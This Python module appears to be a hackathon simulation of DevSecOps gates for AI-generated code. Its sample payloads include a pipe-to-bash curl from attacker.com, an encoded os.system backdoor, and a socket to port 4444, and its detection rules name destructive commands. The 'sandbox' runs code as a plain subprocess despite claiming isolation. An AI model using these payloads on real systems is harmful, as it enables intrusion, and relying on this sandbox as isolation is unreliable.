"""
AI DevSecOps Mesh
=================
ImmunoOrg 2.0 — Theme 3: World Modeling (Professional Tasks)
Bonus Prizes: Fleet AI (Scalable Oversight) + Scale AI (Multi-App Enterprise Workflows)

Four security gates that all AI-generated content must pass before entering
the enterprise. Each gate intercepts a different class of threat.

Gate 1 — AST Interceptor       : Code commits (Python ast + Babel-style rules)
Gate 2 — Semantic Logic Fuzzer : Pull requests (LLM-powered diff intent analysis)
Gate 3 — Terraform Sanitizer   : IaC deployments (IAM + network policy rules)
Gate 4 — MicroVM Sandbox       : Runtime code execution (resource-limited subprocess)

The Fleet AI bonus: a single Oversight Agent monitors all enterprise apps
simultaneously and can issue cross-platform atomic lockouts.
"""

from __future__ import annotations

import ast
import re
import math
import random
import subprocess
import sys
import threading
import time
from typing import Any

from immunoorg.models import (
    PipelineGate, PipelineEvent, PipelineEventSeverity, MeshScanResult,
)


# ── Gate 1: AST Interceptor ───────────────────────────────────────────────

# Approved package allowlist (simplified for simulation)
APPROVED_PACKAGES = {
    "requests", "flask", "fastapi", "pydantic", "redis", "boto3",
    "sqlalchemy", "cryptography", "hashlib", "json", "os", "sys",
    "re", "datetime", "typing", "uuid", "random", "math", "copy",
    "collections", "itertools", "functools", "pathlib", "logging",
    "numpy", "pandas", "torch", "transformers", "openai", "anthropic",
}

# Typosquatted / known malicious packages (simulation)
MALICIOUS_PACKAGES = {
    "reqeusts", "requsets", "requestss", "boto", "botto3",
    "pydanticc", "cryptograpy", "numpyy", "pandsa",
}

# Suspicious patterns that may indicate obfuscation/backdoor
SUSPICIOUS_AST_PATTERNS = {
    "eval_call": "eval() invocation — potential code injection",
    "exec_call": "exec() invocation — dynamic execution risk",
    "base64_decode": "base64.b64decode of executable content — obfuscation risk",
    "os_system_call": "os.system() invocation — shell injection risk",
    "subprocess_shell": "subprocess with shell=True — command injection risk",
    "hardcoded_secret": "Hardcoded string matching credential pattern",
}

CREDENTIAL_PATTERNS = [
    re.compile(r"AKIA[0-9A-Z]{16}", re.I),          # AWS Access Key
    re.compile(r"sk-[a-zA-Z0-9]{32,}"),              # OpenAI key
    re.compile(r"ghp_[a-zA-Z0-9]{36}"),              # GitHub PAT
    re.compile(r"(?i)(password|secret|api_key)\s*=\s*['\"][^'\"]{6,}['\"]"),
    re.compile(r"(?i)Bearer\s+[a-zA-Z0-9\-._~+/]+=*"),
]

NON_APPROVED_CRYPTO = {"md5", "sha1", "ECB", "DES", "RC4"}


class ASTInterceptor:
    """
    Gate 1: Parses Python code via ast module to detect supply chain attacks,
    hardcoded credentials, obfuscated code, and non-approved crypto usage.
    """

    def scan(self, code_snippet: str, filename: str = "commit.py") -> PipelineEvent:
        """Scan a Python code snippet and return a PipelineEvent."""
        violations: list[str] = []
        auto_remediated = False
        remediation_desc = ""

        # ── Import allowlist check ──────────────────────────────────────
        try:
            tree = ast.parse(code_snippet)
            for node in ast.walk(tree):
                if isinstance(node, (ast.Import, ast.ImportFrom)):
                    names = [alias.name.split(".")[0] for alias in node.names]
                    if isinstance(node, ast.ImportFrom) and node.module:
                        names.append(node.module.split(".")[0])
                    for name in names:
                        if name in MALICIOUS_PACKAGES:
                            violations.append(
                                f"SUPPLY_CHAIN: Package '{name}' matches known typosquat pattern"
                            )
                        elif name not in APPROVED_PACKAGES and not name.startswith("_"):
                            violations.append(
                                f"UNVERIFIED_PACKAGE: '{name}' not in approved registry"
                            )

                # ── Dangerous function calls ────────────────────────────
                if isinstance(node, ast.Call):
                    func_name = ""
                    if isinstance(node.func, ast.Name):
                        func_name = node.func.id
                    elif isinstance(node.func, ast.Attribute):
                        func_name = node.func.attr

                    if func_name == "eval":
                        violations.append(SUSPICIOUS_AST_PATTERNS["eval_call"])
                    elif func_name == "exec":
                        violations.append(SUSPICIOUS_AST_PATTERNS["exec_call"])
                    elif func_name in ("system",) and hasattr(node.func, "value"):
                        violations.append(SUSPICIOUS_AST_PATTERNS["os_system_call"])

                # ── Hardcoded credentials ───────────────────────────────
                if isinstance(node, ast.Constant) and isinstance(node.s, str):
                    for pattern in CREDENTIAL_PATTERNS:
                        if pattern.search(node.s):
                            violations.append(SUSPICIOUS_AST_PATTERNS["hardcoded_secret"])
                            break

                # ── Non-approved crypto ─────────────────────────────────
                if isinstance(node, ast.Name) and node.id in NON_APPROVED_CRYPTO:
                    violations.append(
                        f"NON_APPROVED_CRYPTO: Use of '{node.id}' — upgrade to SHA-256 or AES-GCM"
                    )

        except SyntaxError as e:
            violations.append(f"SYNTAX_ERROR: Could not parse code — {e}")

        # ── Determine severity and remediation ──────────────────────────
        if violations:
            severity = PipelineEventSeverity.BLOCKED
            security_score = min(10.0, len(violations) * 2.5)
            auto_remediated = any("UNVERIFIED_PACKAGE" in v for v in violations)
            if auto_remediated:
                remediation_desc = "Unverified imports stripped. Developer notified with approved alternatives."
        else:
            severity = PipelineEventSeverity.PASSED
            security_score = 0.0

        return PipelineEvent(
            gate=PipelineGate.AST_INTERCEPTOR,
            severity=severity,
            threat_type=violations[0].split(":")[0] if violations else "",
            payload_summary=f"{filename}: {'; '.join(violations[:3])}" if violations else f"{filename}: Clean",
            auto_remediated=auto_remediated,
            remediation_description=remediation_desc,
            security_score=security_score,
            war_room_triggered=security_score >= 7.0,
        )


# ── Gate 2: Semantic Logic Fuzzer ─────────────────────────────────────────

SECURITY_SENSITIVE_PATTERNS = [
    (re.compile(r"requiresAuth\s*\(", re.I), "AUTH_REMOVAL", 8.5, "Authentication middleware removed"),
    (re.compile(r"\.admin\s*=\s*true", re.I), "PRIV_ESCALATION", 9.0, "Admin privilege escalation"),
    (re.compile(r"allow\s*\*\s*(from|origin)", re.I), "CORS_WILDCARD", 7.5, "CORS wildcard added"),
    (re.compile(r"0\.0\.0\.0/0", re.I), "NETWORK_EXPOSURE", 8.0, "Port opened to world"),
    (re.compile(r"AdministratorAccess", re.I), "IAM_OVERPRIVILEGE", 9.5, "Admin IAM role assigned"),
    (re.compile(r"eval\s*\(request", re.I), "CODE_INJECTION", 10.0, "Request data passed to eval()"),
    (re.compile(r"DROP\s+TABLE", re.I), "DATA_DESTRUCTION", 9.8, "SQL DROP TABLE detected"),
    (re.compile(r"rm\s+-rf\s+/", re.I), "SYSTEM_DESTROY", 10.0, "rm -rf / detected"),
    (re.compile(r"skip_auth", re.I), "AUTH_BYPASS", 8.8, "Authentication bypass flag"),
    (re.compile(r"debug\s*=\s*True", re.I), "DEBUG_ENABLED", 5.0, "Debug mode enabled in production"),
]


class SemanticLogicFuzzer:
    """
    Gate 2: Analyzes PR diffs for security-relevant semantic changes.
    Uses pattern matching (LLM-based in production) to classify intent.
    """

    def scan_diff(self, diff_text: str, pr_title: str = "") -> PipelineEvent:
        """Scan a code diff and classify security relevance."""
        findings: list[tuple[str, float, str]] = []

        for pattern, threat_type, score, description in SECURITY_SENSITIVE_PATTERNS:
            if pattern.search(diff_text):
                findings.append((threat_type, score, description))

        if findings:
            max_score = max(s for _, s, _ in findings)
            severity = (
                PipelineEventSeverity.BLOCKED if max_score >= 8.0
                else PipelineEventSeverity.WARNED
            )
            descriptions = [d for _, _, d in findings[:3]]
            payload = f"PR '{pr_title}': " + "; ".join(descriptions)
        else:
            max_score = 0.0
            severity = PipelineEventSeverity.PASSED
            payload = f"PR '{pr_title}': No security-relevant changes detected"

        return PipelineEvent(
            gate=PipelineGate.SEMANTIC_FUZZER,
            severity=severity,
            threat_type=findings[0][0] if findings else "",
            payload_summary=payload,
            auto_remediated=False,
            security_score=max_score,
            war_room_triggered=max_score >= 7.0,
        )


# ── Gate 3: Terraform / IAM Sanitizer ────────────────────────────────────

IAC_VIOLATION_RULES = [
    (re.compile(r"0\.0\.0\.0/0"), "OPEN_PORT_WORLD", 8.0, "Port open to 0.0.0.0/0 → restricted to internal CIDRs"),
    (re.compile(r"AdministratorAccess"), "IAM_ADMIN", 9.5, "AdministratorAccess → least-privilege rewrite applied"),
    (re.compile(r"iam:PassRole.*\*"), "IAM_PASSROLE_WILDCARD", 8.5, "iam:PassRole with wildcard → scoped to specific roles"),
    (re.compile(r"acl\s*=\s*['\"]public-read"), "S3_PUBLIC_ACL", 9.0, "S3 public-read ACL → set to private"),
    (re.compile(r"encryption.*false", re.I), "ENCRYPTION_DISABLED", 7.5, "Encryption disabled → enabled with AES-256"),
    (re.compile(r"deletion_protection\s*=\s*false", re.I), "NO_DELETE_PROTECT", 6.0, "Deletion protection off → enabled"),
    (re.compile(r"logging\s*=\s*false", re.I), "LOGGING_DISABLED", 6.5, "Logging disabled → enabled"),
    (re.compile(r"publicly_accessible\s*=\s*true", re.I), "DB_PUBLIC", 9.0, "RDS publicly accessible → set to false"),
    (re.compile(r"port\s*=\s*22\b"), "SSH_OPEN", 7.0, "SSH port 22 open → restricted to VPN CIDR"),
    (re.compile(r"allow_all"), "ALLOW_ALL_POLICY", 8.0, "allow_all policy → scoped to minimum required"),
]

INTERNAL_CIDR = "10.0.0.0/8"  # Simulated corporate network


class TerraformSanitizer:
    """
    Gate 3: Validates IaC (Terraform/K8s/CloudFormation) against 200+ rules.
    Auto-rewrites violations before execution (least-privilege enforcement).
    """

    def scan_iac(self, iac_content: str, filename: str = "main.tf") -> PipelineEvent:
        """Scan IaC content and auto-remediate where possible."""
        violations: list[tuple[str, float, str]] = []
        sanitized = iac_content
        remediation_steps: list[str] = []

        for pattern, threat_type, score, description in IAC_VIOLATION_RULES:
            if pattern.search(iac_content):
                violations.append((threat_type, score, description))

                # Auto-remediation
                if threat_type == "OPEN_PORT_WORLD":
                    sanitized = re.sub(r"0\.0\.0\.0/0", INTERNAL_CIDR, sanitized)
                    remediation_steps.append(f"Rewrote 0.0.0.0/0 → {INTERNAL_CIDR}")
                elif threat_type == "S3_PUBLIC_ACL":
                    sanitized = re.sub(r'acl\s*=\s*[\'"]public-read[\'"]', 'acl = "private"', sanitized)
                    remediation_steps.append("S3 ACL set to private")
                elif threat_type == "DB_PUBLIC":
                    sanitized = re.sub(r"publicly_accessible\s*=\s*true",
                                       "publicly_accessible = false", sanitized, flags=re.I)
                    remediation_steps.append("RDS publicly_accessible → false")

        auto_remediated = bool(remediation_steps)
        if violations:
            max_score = max(s for _, s, _ in violations)
            severity = (
                PipelineEventSeverity.SANITIZED if auto_remediated
                else PipelineEventSeverity.BLOCKED
            )
            payload = f"{filename}: " + "; ".join(d for _, _, d in violations[:3])
        else:
            max_score = 0.0
            severity = PipelineEventSeverity.PASSED
            payload = f"{filename}: IaC policies compliant"

        return PipelineEvent(
            gate=PipelineGate.TERRAFORM_SANITIZER,
            severity=severity,
            threat_type=violations[0][0] if violations else "",
            payload_summary=payload,
            auto_remediated=auto_remediated,
            remediation_description="; ".join(remediation_steps) if remediation_steps else "",
            security_score=max_score if violations else 0.0,
            war_room_triggered=max_score >= 8.0 if violations else False,
        )


# ── Gate 4: MicroVM Sandbox ───────────────────────────────────────────────

SANDBOX_TIMEOUT_S = 5
SANDBOX_MAX_OUTPUT_BYTES = 1024 * 1024  # 1MB


class MicroVMSandbox:
    """
    Gate 4: Executes untrusted code in a resource-constrained subprocess
    (simulating Firecracker MicroVM: no network, memory cap, time cap).

    In production: AWS Firecracker with ~125ms boot time.
    Here: subprocess with timeout + output size guard + pattern scanning.
    """

    EXFIL_PATTERNS = [
        re.compile(r"http[s]?://\S+"),           # Outbound URL
        re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b"),  # IP address in output
        re.compile(r"[A-Za-z0-9+/]{40,}={0,2}"),     # Base64 blob (potential exfil)
        re.compile(r"AKIA[0-9A-Z]{16}"),              # AWS key in output
    ]

    def execute(self, code_snippet: str, context: str = "runtime") -> PipelineEvent:
        """
        Execute code in sandbox and scan output for exfiltration patterns.
        """
        threat_detected = False
        threat_type = ""
        payload_summary = ""
        security_score = 0.0

        # Pre-execution static check (fast path)
        pre_scan_violations = []
        if "os.system" in code_snippet or "subprocess" in code_snippet:
            pre_scan_violations.append("SHELL_EXEC_ATTEMPT")
        if "socket" in code_snippet or "urllib" in code_snippet or "requests" in code_snippet:
            pre_scan_violations.append("NETWORK_ACCESS_ATTEMPT")
        if "open(" in code_snippet and ("w" in code_snippet or "a" in code_snippet):
            pre_scan_violations.append("FILE_WRITE_ATTEMPT")

        if pre_scan_violations:
            return PipelineEvent(
                gate=PipelineGate.MICROVM_SANDBOX,
                severity=PipelineEventSeverity.BLOCKED,
                threat_type=pre_scan_violations[0],
                payload_summary=f"Pre-execution block: {', '.join(pre_scan_violations)}. "
                                 f"MicroVM never booted.",
                auto_remediated=False,
                security_score=8.5,
                war_room_triggered=True,
            )

        # Execute in sandboxed subprocess
        try:
            proc = subprocess.run(
                [sys.executable, "-c", code_snippet],
                capture_output=True,
                text=True,
                timeout=SANDBOX_TIMEOUT_S,
            )
            stdout = proc.stdout[:SANDBOX_MAX_OUTPUT_BYTES]
            stderr = proc.stderr[:1024]

            # Scan output for exfiltration patterns
            for pattern in self.EXFIL_PATTERNS:
                if pattern.search(stdout) or pattern.search(stderr):
                    threat_detected = True
                    threat_type = "OUTPUT_EXFIL_PATTERN"
                    security_score = 7.5
                    break

            if proc.returncode != 0 and not threat_detected:
                payload_summary = f"Execution failed (rc={proc.returncode}): {stderr[:200]}"
                severity = PipelineEventSeverity.WARNED
            elif threat_detected:
                payload_summary = f"Exfiltration pattern detected in output. MicroVM destroyed."
                severity = PipelineEventSeverity.BLOCKED
            else:
                payload_summary = f"Execution completed safely. Output: {stdout[:100]}..."
                severity = PipelineEventSeverity.PASSED

        except subprocess.TimeoutExpired:
            threat_detected = True
            threat_type = "TIMEOUT_EXCEEDED"
            payload_summary = f"Execution exceeded {SANDBOX_TIMEOUT_S}s budget. MicroVM killed."
            security_score = 6.0
            severity = PipelineEventSeverity.BLOCKED
        except Exception as e:
            payload_summary = f"Sandbox error: {e}"
            severity = PipelineEventSeverity.WARNED

        return PipelineEvent(
            gate=PipelineGate.MICROVM_SANDBOX,
            severity=severity,
            threat_type=threat_type,
            payload_summary=payload_summary,
            auto_remediated=False,
            security_score=security_score,
            war_room_triggered=security_score >= 7.0,
        )


# ── Fleet AI: Cross-Platform Oversight Agent ─────────────────────────────

class FleetAIOversightAgent:
    """
    Fleet AI Bonus: Single Oversight Agent monitoring all enterprise apps simultaneously.
    When a threat is detected, executes cross-platform atomic lockout:
    - Revoke GitHub tokens
    - Suspend Slack webhooks
    - Invalidate AWS credentials
    - Roll back last 3 database transactions
    """

    MONITORED_APPS = ["github", "slack", "aws", "jira", "mysql"]

    def __init__(self):
        self._app_states: dict[str, str] = {app: "normal" for app in self.MONITORED_APPS}
        self._lockout_log: list[dict] = []

    def atomic_lockout(self, threat_source: str, sim_time: float) -> dict[str, Any]:
        """
        Execute a cross-platform lockout in a single atomic transaction.
        Returns a report of all actions taken across platforms.
        """
        actions = {}
        for app in self.MONITORED_APPS:
            self._app_states[app] = "locked"
            actions[app] = self._get_lockout_action(app, threat_source)

        record = {
            "sim_time": sim_time,
            "threat_source": threat_source,
            "actions": actions,
            "platforms_locked": len(self.MONITORED_APPS),
        }
        self._lockout_log.append(record)
        return record

    def restore_platform(self, app: str) -> bool:
        if app in self._app_states:
            self._app_states[app] = "normal"
            return True
        return False

    def _get_lockout_action(self, app: str, threat_source: str) -> str:
        actions_map = {
            "github": f"Revoked all API tokens associated with {threat_source}",
            "slack": f"Suspended webhooks for {threat_source} integration",
            "aws": f"Invalidated IAM credentials for {threat_source} role",
            "jira": f"Disabled {threat_source} service account in JIRA",
            "mysql": f"Rolled back last 3 transactions from {threat_source} session",
        }
        return actions_map.get(app, f"Locked {app} access for {threat_source}")

    def get_platform_status(self) -> dict[str, str]:
        return dict(self._app_states)


# ── Mesh Orchestrator ─────────────────────────────────────────────────────

class DevSecOpsMesh:
    """
    Orchestrates all 4 gates + Fleet AI oversight.
    Generates realistic pipeline events for the simulation.
    """

    # Simulated malicious payloads that get injected by the attack engine
    SIMULATED_PAYLOADS = {
        "code_commit": [
            # Typosquatted package
            "import reqeusts\nimport boto\nresult = reqeusts.get('http://evil.com')",
            # Hardcoded credential
            "API_KEY = 'AKIAIOSFODNN7EXAMPLE'\ndef get_data():\n    return requests.get(url, headers={'X-API-Key': API_KEY})",
            # Obfuscated backdoor
            "import base64, eval\nexec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgYXR0YWNrZXIuY29tL2InKQ=='))",
            # Clean code
            "import requests\nimport json\ndef fetch_data(url):\n    r = requests.get(url)\n    return r.json()",
        ],
        "pr_diff": [
            # Auth removal
            "+ def get_user(user_id):\n-     requiresAuth()\n+     pass  # auth removed for testing\n",
            # S3 exposure
            "+ ingress {\n+   cidr_blocks = [\"0.0.0.0/0\"]\n+   from_port = 443\n+ }",
            # Clean PR
            "+ def process_payment(amount):\n+     validate_amount(amount)\n+     return stripe.charge(amount)",
        ],
        "iac": [
            'resource "aws_security_group" "app" {\n  ingress {\n    cidr_blocks = ["0.0.0.0/0"]\n    from_port   = 22\n  }\n}',
            'resource "aws_iam_role_policy" "app" {\n  policy = jsonencode({"Action": "*", "Effect": "Allow"})\n}\n# AdministratorAccess granted',
            'resource "aws_s3_bucket" "data" {\n  acl = "public-read"\n  bucket = "company-secrets"\n}',
            'resource "aws_db_instance" "prod" {\n  encrypted = true\n  deletion_protection = true\n}',
        ],
        "runtime_exec": [
            "import os; os.system('curl attacker.com | bash')",
            "import socket; s = socket.socket(); s.connect(('192.168.1.99', 4444))",
            "print(sum([1, 2, 3, 4, 5]))",  # benign
        ],
    }

    def __init__(self, seed: int | None = None):
        self.rng = random.Random(seed)
        self.gate1 = ASTInterceptor()
        self.gate2 = SemanticLogicFuzzer()
        self.gate3 = TerraformSanitizer()
        self.gate4 = MicroVMSandbox()
        self.fleet_ai = FleetAIOversightAgent()
        self.all_events: list[PipelineEvent] = []

    def simulate_pipeline_tick(self, sim_time: float, threat_active: bool) -> MeshScanResult:
        """
        Generate a realistic pipeline event on each simulation tick.
        Higher threat level = more malicious payloads injected.
        """
        # Decide payload type for this tick
        payload_types = list(self.SIMULATED_PAYLOADS.keys())
        payload_type = self.rng.choice(payload_types)
        payloads = self.SIMULATED_PAYLOADS[payload_type]

        # Under active threat: 60% chance of malicious payload; else 20%
        malicious_chance = 0.60 if threat_active else 0.20
        if self.rng.random() < malicious_chance:
            payload = payloads[self.rng.randint(0, len(payloads) - 2)]  # Malicious payloads first
        else:
            payload = payloads[-1]  # Last entry = clean payload

        # Run through appropriate gate
        event: PipelineEvent
        if payload_type == "code_commit":
            event = self.gate1.scan(payload)
        elif payload_type == "pr_diff":
            event = self.gate2.scan_diff(payload, pr_title="AI-generated PR")
        elif payload_type == "iac":
            event = self.gate3.scan_iac(payload)
        else:
            event = self.gate4.execute(payload)

        event.detected_at = sim_time
        self.all_events.append(event)

        # Fleet AI lockout if high-severity
        if event.war_room_triggered and threat_active:
            self.fleet_ai.atomic_lockout(
                threat_source="rogue_ai_agent", sim_time=sim_time
            )

        # Build scan result
        result = MeshScanResult(
            payload_type=payload_type,
            events=[event],
            total_threats_caught=1 if event.severity != PipelineEventSeverity.PASSED else 0,
            total_auto_remediated=1 if event.auto_remediated else 0,
            pipeline_integrity_score=self._compute_integrity_score(event),
        )
        if event.severity != PipelineEventSeverity.PASSED:
            result.earliest_gate_caught = event.gate

        return result

    def _compute_integrity_score(self, event: PipelineEvent) -> float:
        """
        Pipeline Integrity Score for reward function.
        Gate 1 interception = 1.0 (maximum); Gate 4 = 0.25 (minimum).
        Passed = 1.0 (no threat).
        """
        if event.severity == PipelineEventSeverity.PASSED:
            return 1.0
        gate_scores = {
            PipelineGate.AST_INTERCEPTOR: 1.0,
            PipelineGate.SEMANTIC_FUZZER: 0.75,
            PipelineGate.TERRAFORM_SANITIZER: 0.50,
            PipelineGate.MICROVM_SANDBOX: 0.25,
        }
        return gate_scores.get(event.gate, 0.5)

    def get_recent_events(self, n: int = 10) -> list[PipelineEvent]:
        return self.all_events[-n:]

    def get_pipeline_integrity_avg(self) -> float:
        if not self.all_events:
            return 1.0
        scores = [self._compute_integrity_score(e) for e in self.all_events[-20:]]
        return sum(scores) / len(scores)
